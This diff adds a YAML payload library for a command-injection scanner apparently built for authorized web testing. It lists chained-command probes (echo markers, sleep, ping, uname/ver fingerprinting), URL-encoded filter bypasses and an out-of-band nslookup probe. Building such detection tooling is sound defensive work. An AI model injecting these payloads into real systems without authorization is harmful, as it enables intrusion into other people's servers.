@@ -1,0 +1,209 @@
+# Curated command-injection base payloads for authorized web security testing.
+#
+# Each entry:
+#   id:        stable identifier
+#   category:  one of echo-separator | quote-escape | blind-sleep-linux |
+#              blind-sleep-windows | blind-ping | fingerprint |
+#              encoding-bypass | blind-dns-oob
+#   separator: the shell metacharacter / construct used to chain commands
+#              (omitted for fingerprint and OOB entries that don't fit the model).
+#   os:        any | linux | windows
+#   payload:   the raw injection string. echo-style payloads contain the
+#              literal placeholder ``{MARKER}`` which CmdInjSpecialist replaces
+#              at runtime with a unique per-probe token. Fingerprint payloads
+#              carry fixed shell commands instead.
+#   notes:     short human note. Fingerprint entries also embed
+#              ``expected_signal: ...`` so the specialist knows what to look for.
+#
+# SECURITY: every entry must be safe under DestructiveCommandFilter (default
+# config). No destructive commands. No sleep/timeout/ping -c with N > 10.
+
+# --- echo-separator ---
+- id: cmdinj-semicolon-echo-basic
+  category: echo-separator
+  separator: ";"
+  os: any
+  payload: "; echo {MARKER}"
+  notes: Basic semicolon separator, Unix-style. {MARKER} is replaced by specialist at runtime with a unique token.
+
+- id: cmdinj-and-echo
+  category: echo-separator
+  separator: "&&"
+  os: any
+  payload: "&& echo {MARKER}"
+  notes: Logical AND; runs the echo only when the preceding command succeeds. Confirms previous command exited cleanly.
+
+- id: cmdinj-or-echo
+  category: echo-separator
+  separator: "||"
+  os: any
+  payload: "|| echo {MARKER}"
+  notes: Logical OR; runs the echo when the preceding command fails. Useful when the legit command crashes on the injected suffix.
+
+- id: cmdinj-pipe-echo
+  category: echo-separator
+  separator: "|"
+  os: any
+  payload: "| echo {MARKER}"
+  notes: Pipe separator; the echo runs even when the upstream command produced no output.
+
+- id: cmdinj-newline-echo
+  category: echo-separator
+  separator: "\n"
+  os: linux
+  payload: "\necho {MARKER}"
+  notes: Literal newline separator; effective when the target passes the value through ``sh -c`` line-by-line.
+
+- id: cmdinj-crlf-echo
+  category: echo-separator
+  separator: "\r\n"
+  os: any
+  payload: "\r\necho {MARKER}"
+  notes: CRLF separator; some HTTP-to-shell pipelines preserve carriage returns.
+
+- id: cmdinj-backtick-echo
+  category: echo-separator
+  separator: "`"
+  os: linux
+  payload: "`echo {MARKER}`"
+  notes: Backtick command substitution; the marker is interpolated into the surrounding command.
+
+- id: cmdinj-dollar-paren-echo
+  category: echo-separator
+  separator: "$()"
+  os: linux
+  payload: "$(echo {MARKER})"
+  notes: POSIX command substitution; preferred over backticks for nested cases.
+
+# --- quote-escape ---
+- id: cmdinj-quote-double-break
+  category: quote-escape
+  separator: ";"
+  os: any
+  payload: "\"; echo {MARKER}; #"
+  notes: Closes a double-quoted argument, runs echo, then comments out the rest. Use when the value lands inside ``"..."`` in a server-side shell command.
+
+- id: cmdinj-quote-single-break
+  category: quote-escape
+  separator: ";"
+  os: linux
+  payload: "'; echo {MARKER}; #"
+  notes: Closes a single-quoted argument and comments out the trailing fragment.
+
+- id: cmdinj-quote-escaped-dq
+  category: quote-escape
+  separator: "&&"
+  os: any
+  payload: "\\\"&& echo {MARKER}"
+  notes: Backslash-escaped double quote; helpful when the input is already inside an escape-aware string template.
+
+# --- blind-sleep-linux ---
+- id: cmdinj-blind-sleep-semicolon
+  category: blind-sleep-linux
+  separator: ";"
+  os: linux
+  payload: "; sleep 5"
+  notes: Time-based blind probe; specialist measures elapsed_ms vs baseline. 5s stays well under the DoS guard.
+
+- id: cmdinj-blind-sleep-and
+  category: blind-sleep-linux
+  separator: "&&"
+  os: linux
+  payload: "&& sleep 5"
+  notes: Conditional sleep; only triggers when the preceding command succeeds, useful to confirm exit code.
+
+- id: cmdinj-blind-sleep-pipe
+  category: blind-sleep-linux
+  separator: "|"
+  os: linux
+  payload: "| sleep 5"
+  notes: Pipe-chained sleep; survives even when the legit command emits no output.
+
+- id: cmdinj-blind-sleep-backtick
+  category: blind-sleep-linux
+  separator: "`"
+  os: linux
+  payload: "`sleep 5`"
+  notes: Backtick substitution variant; suitable when separators are filtered but command substitution is not.
+
+# --- blind-sleep-windows ---
+- id: cmdinj-blind-timeout-amp
+  category: blind-sleep-windows
+  separator: "&"
+  os: windows
+  payload: "& timeout /t 5"
+  notes: Windows cmd.exe sequential separator with timeout; pause length stays under the DoS guard.
+
+- id: cmdinj-blind-timeout-and
+  category: blind-sleep-windows
+  separator: "&&"
+  os: windows
+  payload: "&& timeout /t 5"
+  notes: Conditional Windows timeout; runs only on successful preceding command.
+
+# --- blind-ping ---
+- id: cmdinj-blind-ping-linux
+  category: blind-ping
+  separator: ";"
+  os: linux
+  payload: "; ping -c 5 127.0.0.1"
+  notes: ICMP-loop time probe (Linux). Five pings approximate a 4-5s delay; safe under the DoS guard.
+
+- id: cmdinj-blind-ping-windows
+  category: blind-ping
+  separator: "&"
+  os: windows
+  payload: "& ping -n 5 127.0.0.1"
+  notes: Windows ping uses ``-n`` for count. Useful when ``timeout`` is filtered.
+
+# --- fingerprint ---
+- id: cmdinj-fp-uname
+  category: fingerprint
+  separator: ";"
+  os: linux
+  payload: ";uname -a"
+  notes: Linux kernel/host fingerprint. expected_signal=Linux
+
+- id: cmdinj-fp-ver
+  category: fingerprint
+  separator: "&"
+  os: windows
+  payload: "&ver"
+  notes: Windows cmd.exe version banner. expected_signal=Microsoft Windows
+
+- id: cmdinj-fp-pwsh
+  category: fingerprint
+  separator: ";"
+  os: windows
+  payload: ";$PSVersionTable.PSVersion"
+  notes: PowerShell version table. expected_signal=PSVersion
+
+# --- encoding-bypass ---
+- id: cmdinj-enc-urlencoded-semicolon
+  category: encoding-bypass
+  separator: ";"
+  os: any
+  payload: "%3b+echo+{MARKER}"
+  notes: URL-encoded semicolon plus URL-encoded space. Bypasses servers that strip raw ``;`` but URL-decode the value before passing it to a shell.
+
+- id: cmdinj-enc-urlencoded-newline
+  category: encoding-bypass
+  separator: "%0a"
+  os: linux
+  payload: "%0aecho+{MARKER}"
+  notes: URL-encoded LF newline injection; effective against header / log-injection prone wrappers.
+
+- id: cmdinj-enc-backslash-semicolon
+  category: encoding-bypass
+  separator: ";"
+  os: any
+  payload: "\\;echo {MARKER}"
+  notes: Backslash-escaped semicolon; bypasses naive string-replace filters that look for the bare ``;`` byte.
+
+# --- blind-dns-oob ---
+- id: cmdinj-blind-dns-nslookup
+  category: blind-dns-oob
+  separator: ";"
+  os: any
+  payload: "; nslookup {OOB_HOST}"
+  notes: OOB-style blind detection; currently unused, reserved for future phase.
